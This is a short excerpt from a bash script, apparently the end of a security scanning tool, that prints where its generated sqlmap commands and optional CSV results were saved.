[ -f "$SQLMAP_FILE" ]&&[ -s "$SQLMAP_FILE" ]&&echo -e "${YELLOW}SQLmap cmds → ${SQLMAP_FILE}${NC}"
[ "$CSV_MODE" -eq 1 ]&&[ -f "$CSV_FILE" ]&&echo -e "${YELLOW}CSV → ${CSV_FILE}${NC}"